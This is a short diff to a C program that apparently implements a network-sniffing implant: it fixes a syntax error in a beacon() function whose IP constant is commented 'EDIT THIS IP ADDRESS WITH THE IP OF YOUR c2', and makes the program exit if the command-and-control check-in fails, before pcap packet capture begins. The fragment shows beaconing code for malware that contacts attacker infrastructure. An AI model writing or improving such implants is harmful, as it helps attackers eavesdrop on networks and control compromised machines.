@@ -16,7 +16,7 @@ void append(char* s, char c) {
 
 int beacon() {
 	int sock;
-	char* IPADDR = "127.0.0.1" //EDIT THIS IP ADDRESS WITH THE IP OF YOUR c2
+	char* IPADDR = "127.0.0.1"; //EDIT THIS IP ADDRESS WITH THE IP OF YOUR c2
 	struct sockaddr_in server;
 	char message[1000], server_reply[2000];
 	sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -87,7 +87,9 @@ int main(int argc,char **argv)
             ,argv[0]);
         return 0;
     }
-	beacon();
+	if (beacon() != 0) {
+		exit(1);
+	}
     /* assigns device  */
     dev = pcap_lookupdev(errbuf);
 
